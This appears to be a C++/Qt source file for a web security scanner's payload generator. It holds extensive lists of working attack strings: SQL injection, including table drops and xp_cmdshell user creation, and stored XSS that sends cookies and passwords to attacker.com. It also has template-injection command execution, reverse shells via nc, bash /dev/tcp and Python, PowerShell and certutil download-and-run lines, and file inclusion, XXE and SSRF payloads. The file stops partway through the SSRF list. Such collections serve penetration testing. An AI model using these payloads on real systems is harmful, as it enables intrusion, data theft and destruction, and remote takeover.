#include "payloadgenerator.h"
#include <QRandomGenerator>

QStringList PayloadGenerator::generateSqlTimeBasedPayloads() {
    return {
        QStringLiteral("1' AND SLEEP(5)--"),
        QStringLiteral("1\" AND SLEEP(5)--"),
        QStringLiteral("1') AND SLEEP(5)--"),
        QStringLiteral("1\") AND SLEEP(5)--"),
        QStringLiteral("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
        QStringLiteral("1\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
        QStringLiteral("1' OR SLEEP(5)--"),
        QStringLiteral("1' AND BENCHMARK(10000000,SHA1('test'))--"),
        QStringLiteral("1' AND BENCHMARK(5000000,MD5('test'))--"),
        QStringLiteral("1'; WAITFOR DELAY '0:0:5'--"),
        QStringLiteral("1\"; WAITFOR DELAY '0:0:5'--"),
        QStringLiteral("1'); WAITFOR DELAY '0:0:5'--"),
        QStringLiteral("1'; SELECT pg_sleep(5)--"),
        QStringLiteral("1\"; SELECT pg_sleep(5)--"),
        QStringLiteral("1' AND (SELECT 1 FROM pg_sleep(5))--"),
        QStringLiteral("1' || pg_sleep(5)--"),
        QStringLiteral("1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"),
        QStringLiteral("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"),
        QStringLiteral("1' AND UTL_INADDR.GET_HOST_ADDRESS('sleep5.attacker.com')--"),
        QStringLiteral("1' AND 1=IF(1=1,SLEEP(5),0)--"),
        QStringLiteral("1' AND 1=IF(1=1,BENCHMARK(5000000,SHA1(0x41)),0)--"),
        QStringLiteral("1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
        QStringLiteral("1' XOR SLEEP(5)--"),
        QStringLiteral("1' DIV SLEEP(5)--"),
        QStringLiteral("(SELECT SLEEP(5))"),
        QStringLiteral("(SELECT(0)FROM(SELECT(SLEEP(5)))a)"),
        QStringLiteral("1 AND SLEEP(5)"),
        QStringLiteral("1 OR SLEEP(5)"),
        QStringLiteral("SLEEP(5)#"),
        QStringLiteral("SLEEP(5)/*"),
        QStringLiteral("IF(1=1,SLEEP(5),0)"),
        QStringLiteral("IF(1=2,0,SLEEP(5))"),
    };
}

QStringList PayloadGenerator::generateSqlErrorBasedPayloads() {
    return {
        QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--"),
        QStringLiteral("1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--"),
        QStringLiteral("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--"),
        QStringLiteral("1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--"),
        QStringLiteral("1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e),1)--"),
        QStringLiteral("1' AND EXP(~(SELECT * FROM (SELECT user())a))--"),
        QStringLiteral("1' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--"),
        QStringLiteral("1' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT user()),0x7e)) USING utf8)))--"),
        QStringLiteral("1' AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1))a)--"),
        QStringLiteral("1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--"),
        QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--"),
        QStringLiteral("1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--"),
        QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--"),
        QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"),
        QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@datadir),0x7e))--"),
        QStringLiteral("1' AND EXTRACTVALUE(1,CONCAT(0x7e,SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31),0x7e))--"),
        QStringLiteral("1' AND CAST((SELECT user()) AS INT)--"),
        QStringLiteral("1'; SELECT CAST((SELECT user()) AS INT)--"),
        QStringLiteral("1' AND 1=CONVERT(int,(SELECT user()))--"),
        QStringLiteral("1'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--"),
        QStringLiteral("1' UNION SELECT NULL,CONCAT(user(),0x3a,password) FROM mysql.user--"),
        QStringLiteral("1' AND (SELECT TOP 1 CAST(username AS INT) FROM users)--"),
        QStringLiteral("1' AND 1=(SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END)--"),
    };
}

QStringList PayloadGenerator::generateSqlUnionPayloads(int columns) {
    QStringList payloads;
    QString nulls;
    for (int i = 1; i <= columns; ++i) {
        if (i > 1) nulls += QStringLiteral(",");
        nulls += QStringLiteral("NULL");

        payloads << QString(QStringLiteral("' UNION SELECT %1--")).arg(nulls);
        payloads << QString(QStringLiteral("\" UNION SELECT %1--")).arg(nulls);
        payloads << QString(QStringLiteral("') UNION SELECT %1--")).arg(nulls);
        payloads << QString(QStringLiteral("\") UNION SELECT %1--")).arg(nulls);
        payloads << QString(QStringLiteral("' UNION ALL SELECT %1--")).arg(nulls);
        payloads << QString(QStringLiteral("-1 UNION SELECT %1--")).arg(nulls);
        payloads << QString(QStringLiteral("-1' UNION SELECT %1--")).arg(nulls);
    }

    for (int i = 1; i <= columns; ++i) {
        QString cols;
        for (int j = 1; j <= columns; ++j) {
            if (j > 1) cols += QStringLiteral(",");
            if (j == i) cols += QStringLiteral("@@version");
            else cols += QStringLiteral("NULL");
        }
        payloads << QString(QStringLiteral("' UNION SELECT %1--")).arg(cols);
    }

    for (int i = 1; i <= columns; ++i) {
        QString cols;
        for (int j = 1; j <= columns; ++j) {
            if (j > 1) cols += QStringLiteral(",");
            if (j == i) cols += QStringLiteral("user()");
            else cols += QStringLiteral("NULL");
        }
        payloads << QString(QStringLiteral("' UNION SELECT %1--")).arg(cols);
    }

    return payloads;
}

QStringList PayloadGenerator::generateSqlBooleanPayloads() {
    return {
        QStringLiteral("1' AND 1=1--"),
        QStringLiteral("1' AND 1=2--"),
        QStringLiteral("1' AND 'a'='a'--"),
        QStringLiteral("1' AND 'a'='b'--"),
        QStringLiteral("1\" AND 1=1--"),
        QStringLiteral("1\" AND 1=2--"),
        QStringLiteral("1') AND 1=1--"),
        QStringLiteral("1') AND 1=2--"),
        QStringLiteral("1' AND (SELECT 1)=1--"),
        QStringLiteral("1' AND (SELECT 1)=2--"),
        QStringLiteral("1' AND (SELECT SUBSTRING(user(),1,1))='r'--"),
        QStringLiteral("1' AND (SELECT SUBSTRING(user(),1,1))='a'--"),
        QStringLiteral("1' AND ASCII(SUBSTRING(user(),1,1))>90--"),
        QStringLiteral("1' AND ASCII(SUBSTRING(user(),1,1))<90--"),
        QStringLiteral("1' AND ASCII(SUBSTRING(database(),1,1))>90--"),
        QStringLiteral("1' AND LENGTH(user())>5--"),
        QStringLiteral("1' AND LENGTH(database())>5--"),
        QStringLiteral("1' AND (SELECT COUNT(*) FROM information_schema.tables)>10--"),
        QStringLiteral("1' OR 1=1--"),
        QStringLiteral("1' OR 1=2--"),
        QStringLiteral("1' OR 'a'='a'--"),
        QStringLiteral("1' XOR 1=1--"),
        QStringLiteral("1' XOR 1=2--"),
        QStringLiteral("1 AND 1=1"),
        QStringLiteral("1 AND 1=2"),
        QStringLiteral("1 OR 1=1"),
        QStringLiteral("1 OR 1=2"),
    };
}

QStringList PayloadGenerator::generateSqlStackedPayloads() {
    return {
        QStringLiteral("1'; DROP TABLE users--"),
        QStringLiteral("1'; DELETE FROM users--"),
        QStringLiteral("1'; UPDATE users SET password='hacked'--"),
        QStringLiteral("1'; INSERT INTO users VALUES('hacker','hacked')--"),
        QStringLiteral("1'; CREATE TABLE test(id INT)--"),
        QStringLiteral("1'; EXEC xp_cmdshell 'whoami'--"),
        QStringLiteral("1'; EXEC sp_configure 'show advanced options',1--"),
        QStringLiteral("1'; EXEC sp_configure 'xp_cmdshell',1--"),
        QStringLiteral("1'; EXEC master..xp_cmdshell 'net user hacker /add'--"),
        QStringLiteral("1'; DECLARE @q VARCHAR(8000);SET @q=0x77686f616d69;EXEC(@q)--"),
        QStringLiteral("1'; SELECT * INTO OUTFILE '/tmp/test.txt' FROM users--"),
        QStringLiteral("1'; SELECT LOAD_FILE('/etc/passwd')--"),
        QStringLiteral("1'; COPY users TO '/tmp/users.txt'--"),
        QStringLiteral("1'; \\! whoami--"),
        QStringLiteral("1'; COPY (SELECT '') TO PROGRAM 'whoami'--"),
        QStringLiteral("1'; CREATE EXTENSION IF NOT EXISTS dblink--"),
    };
}

QStringList PayloadGenerator::generateXssReflectedPayloads() {
    return {
        QStringLiteral("<script>alert(1)</script>"),
        QStringLiteral("<script>alert(String.fromCharCode(88,83,83))</script>"),
        QStringLiteral("<img src=x onerror=alert(1)>"),
        QStringLiteral("<img src=x onerror=alert(String.fromCharCode(88,83,83))>"),
        QStringLiteral("<svg onload=alert(1)>"),
        QStringLiteral("<svg/onload=alert(1)>"),
        QStringLiteral("<body onload=alert(1)>"),
        QStringLiteral("<input onfocus=alert(1) autofocus>"),
        QStringLiteral("<marquee onstart=alert(1)>"),
        QStringLiteral("<details open ontoggle=alert(1)>"),
        QStringLiteral("<video><source onerror=alert(1)>"),
        QStringLiteral("<audio src=x onerror=alert(1)>"),
        QStringLiteral("<iframe src=javascript:alert(1)>"),
        QStringLiteral("<iframe srcdoc='<script>alert(1)</script>'>"),
        QStringLiteral("<object data=javascript:alert(1)>"),
        QStringLiteral("<embed src=javascript:alert(1)>"),
        QStringLiteral("<a href=javascript:alert(1)>click</a>"),
        QStringLiteral("<form action=javascript:alert(1)><input type=submit>"),
        QStringLiteral("<button formaction=javascript:alert(1)>click</button>"),
        QStringLiteral("<math><maction actiontype=statusline xlink:href=javascript:alert(1)>click"),
        QStringLiteral("<table background=javascript:alert(1)>"),
        QStringLiteral("<div style=width:expression(alert(1))>"),
        QStringLiteral("<style>*{background:url(javascript:alert(1))}</style>"),
        QStringLiteral("-'-alert(1)-'"),
        QStringLiteral("'-alert(1)-'"),
        QStringLiteral("\"-alert(1)-\""),
    };
}

QStringList PayloadGenerator::generateXssStoredPayloads() {
    return {
        QStringLiteral("<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>"),
        QStringLiteral("<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>"),
        QStringLiteral("<img src=x onerror=\"this.src='http://attacker.com/steal.php?c='+document.cookie\">"),
        QStringLiteral("<svg onload=\"fetch('http://attacker.com/steal.php?c='+document.cookie)\">"),
        QStringLiteral("<script>fetch('http://attacker.com/steal.php?c='+document.cookie)</script>"),
        QStringLiteral("<script>navigator.sendBeacon('http://attacker.com/steal.php',document.cookie)</script>"),
        QStringLiteral("<script>var x=new XMLHttpRequest();x.open('GET','http://attacker.com/steal.php?c='+document.cookie,true);x.send()</script>"),
        QStringLiteral("<img src=x onerror=\"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))\">"),
        QStringLiteral("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"),
        QStringLiteral("<script>document.body.innerHTML='<h1>Defaced</h1>'</script>"),
        QStringLiteral("<script>window.onload=function(){document.forms[0].action='http://attacker.com/phish.php'}</script>"),
        QStringLiteral("<script>document.querySelector('input[type=password]').addEventListener('blur',function(){fetch('http://attacker.com/steal.php?p='+this.value)})</script>"),
    };
}

QStringList PayloadGenerator::generateXssDomPayloads() {
    return {
        QStringLiteral("#<img src=x onerror=alert(1)>"),
        QStringLiteral("#<script>alert(1)</script>"),
        QStringLiteral("javascript:alert(1)"),
        QStringLiteral("data:text/html,<script>alert(1)</script>"),
        QStringLiteral("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="),
        QStringLiteral("?param=<script>alert(1)</script>"),
        QStringLiteral("?param='-alert(1)-'"),
        QStringLiteral("?callback=alert"),
        QStringLiteral("?jsonp=alert(1)//"),
        QStringLiteral("#<svg onload=alert(1)>"),
        QStringLiteral("?__proto__[test]=alert(1)"),
        QStringLiteral("?constructor[prototype][test]=alert(1)"),
        QStringLiteral("?__proto__.test=alert(1)"),
        QStringLiteral("#{{constructor.constructor('alert(1)')()}}"),
        QStringLiteral("#${alert(1)}"),
        QStringLiteral("#{{7*7}}"),
    };
}

QStringList PayloadGenerator::generateXssPolyglotPayloads() {
    return {
        QStringLiteral("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"),
        QStringLiteral("'\"><img src=x onerror=alert(1)//"),
        QStringLiteral("'\"--></style></script><script>alert(1)</script>"),
        QStringLiteral("'-alert(1)-'"),
        QStringLiteral("'-alert(1)//"),
        QStringLiteral("</script><script>alert(1)</script>"),
        QStringLiteral("</ScRiPt><ScRiPt>alert(1)</ScRiPt>"),
        QStringLiteral("';alert(1)//"),
        QStringLiteral("\";alert(1)//"),
        QStringLiteral("\\';alert(1)//"),
        QStringLiteral("</title><script>alert(1)</script>"),
        QStringLiteral("</textarea><script>alert(1)</script>"),
        QStringLiteral("--><script>alert(1)</script>"),
        QStringLiteral("]]><script>alert(1)</script>"),
        QStringLiteral("*/alert(1)/*"),
        QStringLiteral("*/</script><script>alert(1)/*"),
    };
}

QStringList PayloadGenerator::generateSstiPayloads(const QString &engine) {
    if (engine == QStringLiteral("jinja2")) return generateSstiJinja2Payloads();
    if (engine == QStringLiteral("twig")) return generateSstiTwigPayloads();
    if (engine == QStringLiteral("freemarker")) return generateSstiFreemarkerPayloads();
    if (engine == QStringLiteral("velocity")) return generateSstiVelocityPayloads();
    if (engine == QStringLiteral("mako")) return generateSstiMakoPayloads();

    QStringList all;
    all << generateSstiJinja2Payloads();
    all << generateSstiTwigPayloads();
    all << generateSstiFreemarkerPayloads();
    all << generateSstiVelocityPayloads();
    all << generateSstiMakoPayloads();
    return all;
}

QStringList PayloadGenerator::generateSstiJinja2Payloads() {
    return {
        QStringLiteral("{{7*7}}"),
        QStringLiteral("{{7*'7'}}"),
        QStringLiteral("{{config}}"),
        QStringLiteral("{{config.items()}}"),
        QStringLiteral("{{settings.SECRET_KEY}}"),
        QStringLiteral("{{request}}"),
        QStringLiteral("{{request.environ}}"),
        QStringLiteral("{{request.application.__globals__}}"),
        QStringLiteral("{{''.__class__}}"),
        QStringLiteral("{{''.__class__.__mro__}}"),
        QStringLiteral("{{''.__class__.__mro__[2]}}"),
        QStringLiteral("{{''.__class__.__mro__[2].__subclasses__()}}"),
        QStringLiteral("{{''.__class__.__base__.__subclasses__()}}"),
        QStringLiteral("{{[].__class__.__base__.__subclasses__()}}"),
        QStringLiteral("{{().__class__.__base__.__subclasses__()}}"),
        QStringLiteral("{{cycler.__init__.__globals__.os.popen('id').read()}}"),
        QStringLiteral("{{joiner.__init__.__globals__.os.popen('id').read()}}"),
        QStringLiteral("{{namespace.__init__.__globals__.os.popen('id').read()}}"),
        QStringLiteral("{{lipsum.__globals__.os.popen('id').read()}}"),
        QStringLiteral("{{lipsum.__globals__.__builtins__['__import__']('os').popen('id').read()}}"),
        QStringLiteral("{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"),
        QStringLiteral("{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}"),
        QStringLiteral("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
        QStringLiteral("{{g.pop.__globals__.__builtins__['__import__']('os').popen('id').read()}}"),
    };
}

QStringList PayloadGenerator::generateSstiTwigPayloads() {
    return {
        QStringLiteral("{{7*7}}"),
        QStringLiteral("{{7*'7'}}"),
        QStringLiteral("{{dump(app)}}"),
        QStringLiteral("{{app.request.server.all|join(',')}}"),
        QStringLiteral("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
        QStringLiteral("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"),
        QStringLiteral("{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}"),
        QStringLiteral("{{['id']|filter('system')}}"),
        QStringLiteral("{{['cat /etc/passwd']|filter('system')}}"),
        QStringLiteral("{{['id']|map('system')|join}}"),
        QStringLiteral("{{['id',0]|sort('system')|join}}"),
        QStringLiteral("{{['id']|filter('passthru')}}"),
        QStringLiteral("{{['/readflag']|filter('exec')}}"),
        QStringLiteral("{{app.request.query.filter(0,'id',1024,{'options':'system'})}}"),
        QStringLiteral("{{'id'|filter('system')}}"),
        QStringLiteral("{{constant('phpversion')()}}"),
    };
}

QStringList PayloadGenerator::generateSstiFreemarkerPayloads() {
    return {
        QStringLiteral("${7*7}"),
        QStringLiteral("#{7*7}"),
        QStringLiteral("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"),
        QStringLiteral("[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ ex(\"id\") }"),
        QStringLiteral("${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")}"),
        QStringLiteral("<#assign classloader=object.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}"),
        QStringLiteral("${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\" \")}"),
        QStringLiteral("[=7*7]"),
        QStringLiteral("${\"freemarker.template.utility.Execute\"?new()(\"id\")}"),
    };
}

QStringList PayloadGenerator::generateSstiVelocityPayloads() {
    return {
        QStringLiteral("#set($x=7*7)${x}"),
        QStringLiteral("$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")"),
        QStringLiteral("#set($rt=$class.inspect(\"java.lang.Runtime\").type.getRuntime())#set($proc=$rt.exec(\"id\"))#set($is=$proc.getInputStream())#set($br=Class.forName(\"java.io.BufferedReader\").getConstructor(Class.forName(\"java.io.Reader\")).newInstance(Class.forName(\"java.io.InputStreamReader\").getConstructor(Class.forName(\"java.io.InputStream\")).newInstance($is)))#set($out=\"\")#foreach($i in [1..10])#set($out=$out.concat($br.readLine()))#end$out"),
        QStringLiteral("#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"),
        QStringLiteral("${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"),
    };
}

QStringList PayloadGenerator::generateSstiMakoPayloads() {
    return {
        QStringLiteral("${7*7}"),
        QStringLiteral("<%import os%>${os.popen('id').read()}"),
        QStringLiteral("<%import os; x=os.popen('id').read()%>${x}"),
        QStringLiteral("${self.module.cache.util.os.popen('id').read()}"),
        QStringLiteral("${self.module.runtime.util.os.system('id')}"),
        QStringLiteral("<%import subprocess%>${subprocess.check_output('id',shell=True)}"),
        QStringLiteral("<%\nimport os\nx=os.popen('id').read()\n%>\n${x}"),
    };
}

QStringList PayloadGenerator::generateOsCommandPayloads(const QString &os) {
    if (os == QStringLiteral("linux")) return generateLinuxCommandPayloads();
    if (os == QStringLiteral("windows")) return generateWindowsCommandPayloads();

    QStringList all;
    all << generateLinuxCommandPayloads();
    all << generateWindowsCommandPayloads();
    return all;
}

QStringList PayloadGenerator::generateLinuxCommandPayloads() {
    return {
        QStringLiteral("; id"),
        QStringLiteral("| id"),
        QStringLiteral("|| id"),
        QStringLiteral("& id"),
        QStringLiteral("&& id"),
        QStringLiteral("`id`"),
        QStringLiteral("$(id)"),
        QStringLiteral("; cat /etc/passwd"),
        QStringLiteral("| cat /etc/passwd"),
        QStringLiteral("; ls -la"),
        QStringLiteral("| ls -la"),
        QStringLiteral("; whoami"),
        QStringLiteral("| whoami"),
        QStringLiteral("; uname -a"),
        QStringLiteral("| uname -a"),
        QStringLiteral("; ifconfig"),
        QStringLiteral("| ifconfig"),
        QStringLiteral("; ip addr"),
        QStringLiteral("| ip addr"),
        QStringLiteral("; curl http://attacker.com"),
        QStringLiteral("| curl http://attacker.com"),
        QStringLiteral("; wget http://attacker.com"),
        QStringLiteral("| wget http://attacker.com"),
        QStringLiteral("; ping -c 1 attacker.com"),
        QStringLiteral("| ping -c 1 attacker.com"),
        QStringLiteral("; nc -e /bin/sh attacker.com 4444"),
        QStringLiteral("; bash -i >& /dev/tcp/attacker.com/4444 0>&1"),
        QStringLiteral("; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"),
        QStringLiteral(";${IFS}id"),
        QStringLiteral("|${IFS}id"),
        QStringLiteral("$IFS;id"),
        QStringLiteral(";echo${IFS}test"),
        QStringLiteral("|echo${IFS}test"),
        QStringLiteral("a]id[a"),
        QStringLiteral("a]|id|[a"),
        QStringLiteral(";{id,}"),
        QStringLiteral("|{id,}"),
        QStringLiteral("id%0a"),
        QStringLiteral("id%0A"),
        QStringLiteral("%0aid"),
        QStringLiteral("%0Aid"),
    };
}

QStringList PayloadGenerator::generateWindowsCommandPayloads() {
    return {
        QStringLiteral("& whoami"),
        QStringLiteral("| whoami"),
        QStringLiteral("|| whoami"),
        QStringLiteral("&& whoami"),
        QStringLiteral("& dir"),
        QStringLiteral("| dir"),
        QStringLiteral("& type c:\\windows\\win.ini"),
        QStringLiteral("| type c:\\windows\\win.ini"),
        QStringLiteral("& net user"),
        QStringLiteral("| net user"),
        QStringLiteral("& ipconfig"),
        QStringLiteral("| ipconfig"),
        QStringLiteral("& systeminfo"),
        QStringLiteral("| systeminfo"),
        QStringLiteral("& hostname"),
        QStringLiteral("| hostname"),
        QStringLiteral("& net localgroup administrators"),
        QStringLiteral("& tasklist"),
        QStringLiteral("& netstat -an"),
        QStringLiteral("& ping -n 1 attacker.com"),
        QStringLiteral("& nslookup attacker.com"),
        QStringLiteral("& powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\""),
        QStringLiteral("& certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe"),
        QStringLiteral("%0awhoami"),
        QStringLiteral("%0d%0awhoami"),
        QStringLiteral("^&whoami"),
    };
}

QStringList PayloadGenerator::generateLfiPayloads() {
    return {
        QStringLiteral("../../../etc/passwd"),
        QStringLiteral("....//....//....//etc/passwd"),
        QStringLiteral("..\\..\\..\\etc\\passwd"),
        QStringLiteral("../../../etc/passwd%00"),
        QStringLiteral("../../../etc/passwd%00.jpg"),
        QStringLiteral("....//....//....//etc/passwd%00"),
        QStringLiteral("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
        QStringLiteral("%252e%252e%252f%252e%252e%252fetc%252fpasswd"),
        QStringLiteral("..%c0%af..%c0%af..%c0%afetc/passwd"),
        QStringLiteral("..%252f..%252f..%252fetc/passwd"),
        QStringLiteral("/etc/passwd"),
        QStringLiteral("///etc/passwd"),
        QStringLiteral("/var/log/apache/access.log"),
        QStringLiteral("/var/log/apache2/access.log"),
        QStringLiteral("/var/log/nginx/access.log"),
        QStringLiteral("/proc/self/environ"),
        QStringLiteral("/proc/self/cmdline"),
        QStringLiteral("/proc/self/fd/0"),
        QStringLiteral("/proc/self/fd/1"),
        QStringLiteral("/proc/self/fd/2"),
        QStringLiteral("php://filter/convert.base64-encode/resource=/etc/passwd"),
        QStringLiteral("php://filter/read=convert.base64-encode/resource=index.php"),
        QStringLiteral("php://input"),
        QStringLiteral("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="),
        QStringLiteral("expect://id"),
        QStringLiteral("file:///etc/passwd"),
        QStringLiteral("file:///c:/windows/win.ini"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\windows\\win.ini"),
        QStringLiteral("..\\..\\..\\..\\..\\..\\boot.ini"),
        QStringLiteral("C:\\Windows\\win.ini"),
        QStringLiteral("C:/Windows/win.ini"),
    };
}

QStringList PayloadGenerator::generateRfiPayloads() {
    return {
        QStringLiteral("http://attacker.com/shell.txt"),
        QStringLiteral("http://attacker.com/shell.txt%00"),
        QStringLiteral("http://attacker.com/shell.txt?"),
        QStringLiteral("https://attacker.com/shell.txt"),
        QStringLiteral("ftp://attacker.com/shell.txt"),
        QStringLiteral("//attacker.com/shell.txt"),
        QStringLiteral("\\\\attacker.com\\share\\shell.txt"),
        QStringLiteral("http://attacker.com/shell"),
        QStringLiteral("data://text/plain,<?php system($_GET['c']); ?>"),
        QStringLiteral("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="),
    };
}

QStringList PayloadGenerator::generatePathNormalizationPayloads() {
    return {
        QStringLiteral("....//"),
        QStringLiteral("....\\\\"),
        QStringLiteral("..../"),
        QStringLiteral("....\\"),
        QStringLiteral("....//....//"),
        QStringLiteral("..../..../"),
        QStringLiteral("%2e%2e%2f"),
        QStringLiteral("%2e%2e/"),
        QStringLiteral("..%2f"),
        QStringLiteral("%2e%2e%5c"),
        QStringLiteral("..%5c"),
        QStringLiteral("%252e%252e%252f"),
        QStringLiteral("%252e%252e%255c"),
        QStringLiteral("..%252f"),
        QStringLiteral("..%255c"),
        QStringLiteral("%c0%ae%c0%ae/"),
        QStringLiteral("%c0%ae%c0%ae\\"),
        QStringLiteral("..%c0%af"),
        QStringLiteral("..%c1%9c"),
        QStringLiteral("%uff0e%uff0e%u2215"),
        QStringLiteral("%uff0e%uff0e%u2216"),
        QStringLiteral("..;/"),
        QStringLiteral(";/../"),
        QStringLiteral("..%00/"),
        QStringLiteral("..%0d/"),
        QStringLiteral("..%0a/"),
    };
}

QStringList PayloadGenerator::generateXxeOobPayloads(const QString &callback) {
    return {
        QString(QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"%1\">%xxe;]><foo/>")).arg(callback),
        QString(QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"%1/evil.dtd\">%xxe;%%payload;]><foo>&send;</foo>")).arg(callback),
        QString(QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % xxe SYSTEM \"%1/evil.dtd\">%xxe;]><foo/>")).arg(callback),
        QString(QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"%1/evil.dtd\"><foo>&xxe;</foo>")).arg(callback),
    };
}

QStringList PayloadGenerator::generateXxeErrorPayloads() {
    return {
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///nonexistent\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY error \"&xxe;\">]><foo>&error;</foo>"),
    };
}

QStringList PayloadGenerator::generateXxeLocalPayloads() {
    return {
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>"),
        QStringLiteral("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"),
    };
}

QStringList PayloadGenerator::generateSsrfIpBypassPayloads() {
    return {
        QStringLiteral("http://127.0.0.1"),
        QStringLiteral("http://localhost"),
        QStringLiteral("http://[::1]"),
        QStringLiteral("http://0.0.0.0"),
        QStringLiteral("http://127.1"),
        QStringLiteral("http://127.0.1"),
